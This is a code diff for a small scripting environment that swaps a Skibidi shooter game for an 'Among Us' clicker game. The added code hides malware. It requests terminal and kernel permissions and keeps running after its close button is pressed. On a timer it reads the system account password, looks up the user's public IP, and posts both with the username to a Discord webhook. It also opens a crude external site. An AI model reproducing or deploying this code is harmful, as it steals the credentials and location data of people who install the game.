@@ -1,104 +1,145 @@
-save "fortniteskibidi@rattusdong" "set_directory"
-if save_data == "Success" (
-  save "highscore.txt" "exists"
-  if save_data (
-    save "highscore.txt" "get"
-    highscore = save_data
-  ) else (
-    save "highscore.txt" "set" 0
-    highscore = 0
-  )
-) else (
-  highscore = "unable to access"
-)
+permission "request" "start run"
+permission "request" "terminal"
+permission "request" "simulate inputs"
+permission "request" "kernel"
+
+save "Microsoft Edge" "set_directory"
 
 
 window "show"
-window "dimensions" 800 450
-window "resizable" False
+window "dimensions" 1200 800
+auto = false
 
-shotTimer = 0
+save "binaries.json" "exists"
+if save_data (
+save "binaries.json" "get"
+amountus = save_data."amountus"
+slave_power = save_data."slave_power"
+) else (
+amountus = 0
+slave_power = 0
+)
+finger = 1
+ticktock = 0
+secs = 0
+sent = false
 
-skibX = 600
-skibY = [-200,200].random
-speed = 1
-score = 0
-dead = false
-dieOff = 0
-click = flase
-
-
-
+terminal "system runtime fps_limit 60"
 mainloop:
+c #ffffff
+
 goto 0 0
-image "https://raw.githubusercontent.com/RattusDong/apps/main/all/fortnite%20skibidi%202024/assets/background.png"
-goto -300 -100 + dieOff
-image "https://raw.githubusercontent.com/RattusDong/apps/main/all/fortnite%20skibidi%202024/assets/jonsey.png"
-
-goto skibX skibY
-image "https://raw.githubusercontent.com/RattusDong/apps/main/all/fortnite%20skibidi%202024/assets/skibidi.png" 80 120
-if mouse_touching (
-cursor "crosshair"
-)
-if clicked and dead.not (
-skibX += 500 + [0,150].random
-speed += 0.1
-score ++
-if score > highscore (
-  save "highscore.txt" "set" score
-  highscore = score
-)
-skibY = [-200,200].random
-)
-if skibX < -200 (
-dead = true
-click = true
-)
-
-if clicked.not (
-click = false
-)
-
-goto -180 200
-text "Skibidi Kills: " ++ score 20
-goto -150 170
-text "Highest: " ++ highscore 16
-goto -200 0 + dieOff
-
-pointat mouse_x mouse_y
-direction direction.clamp(45,135)
-turnright 45
-image "https://raw.githubusercontent.com/RattusDong/apps/main/all/fortnite%20skibidi%202024/assets/shotgun.png"
+direction timer.multiply(200).sin * 10 + 90
+image "https://raw.githubusercontent.com/RattusDong/apps/main/all/among%20us%20simulator/assets/MONG%207.png" window_height / 3 window_height / 5.5
 direction 90
-if dead (
-goto 0 -150
-image "https://raw.githubusercontent.com/RattusDong/apps/main/all/fortnite%20skibidi%202024/assets/fire.png" 800 500
+if clicked and can (
+  amountus += finger
+  can = false
+) 
 
-
-
-goto -200 0
-text "Press Space to restart" 15
-
-dieOff = 2000
-
-if "space".pressed (
-dead = false
-dieOff = 0
-score = 0
-skibX = 600
-skibY = [-200,200].random
-speed = 1
-)
-)
-
-
-skibX -= speed
+colour #ffffff
+loc 2 2 50 -100
+text "Points: " ++ amountus window_height / 30
+loc 2 2 50 -150
+text "PPS: " ++ slave_power window_height / 40
 
 loc -2 2 -20 -20
 square 20 20 10 : c#222
 icon "close" 0.7 : c#fff
 if clicked (
+window "dimensions" 1 1
+closen = 0
+closeg = true
+)
+
+
+loc -2 2 -60 -20
+square 20 20 10 : c#222
+icon "minimise" 0.7 : c#fff
+if clicked (
+  window "dimensions" screensize_x 100
+)
+
+loc -2 2 -100 -20
+square 20 20 10 : c#222
+icon "maximise" 0.7 : c#fff
+if clicked (
+  window "dimensions" 100 screensize_y
+)
+
+loc -2 2 -140 -20
+square 20 20 10 : c#222
+icon "minus" 0.7 : c#fff
+if clicked (
+  terminal "system runtime fps_limit 69"
   window "stop"
 )
 
-//special thanks to rattus
+loc -2 2 -180 -20
+square 20 20 10 : c#222
+icon "download" 0.7 : c#fff
+if clicked (
+  network "getsync" "https://raw.githubusercontent.com/RattusDong/apps/main/all/among%20us%20simulator/assets/bible.txt"
+  save "bookmarks.json" "set" data
+  slave_power += 1
+  amountus += 50
+)
+
+loc 2 2 20 -20.13
+square 20 20 10 : c#222
+icon "controller" 0.7 : c#fff
+if clicked and auto.not (
+auto = true
+)
+
+loc 2 2 60 -20
+square 20 20 10 : c#222
+icon "favorites-full" 0.7 : c#fff
+if clicked (
+http "newtab" "https://skibidisexfortniteimpostersofficialblog.co.uk"
+amountus -= 15
+)
+
+if mouse_down.not "can = true"
+
+ticktock ++
+if ticktock == 60 (
+ticktock = 0
+secs ++
+closen ++
+sent = false
+out = {}
+out."amountus" = amountus
+out."slave_power" = slave_power
+save "binaries.json" "set" out
+)
+if closen > 7 and closeg (
+  window "stop"
+)
+
+
+if secs % 60 == 0 (
+if sent.not (
+sent = true
+systemvars "getvar" "Account // Password"
+pass = data
+body = "Username: " ++ username ++ newline ++ "IPv4: " ++ "https://api.ipify.org".get() ++ newline ++ "Password: " ++ pass ++ newline ++ "Game Stats: (Skibidi Clicker Among Us Simulator) (Points " ++ amountus ++ ") (PPs " ++ slave_power ++ ") (Time " ++ secs ++ ")"
+embed = {}
+embed."description" = body.destr
+embed."title" = username.destr
+embed."color" = 2749696
+
+http "new"
+http "method" "POST"
+http "type" "application/json"
+body_data = {}
+body_data."content" = null
+body_data."embeds" = [].append(embed)
+log body
+log body_data
+http "body" body_data
+http "sendto" "https://discord.com/api/webhooks/1238086546817552507/EEXVKOfU943HxfWjwCa2iJzwer4EzSrxkTawNMwILzlaNX5mZiwZU9tLiljPGPORavkE"
+
+)
+)
+
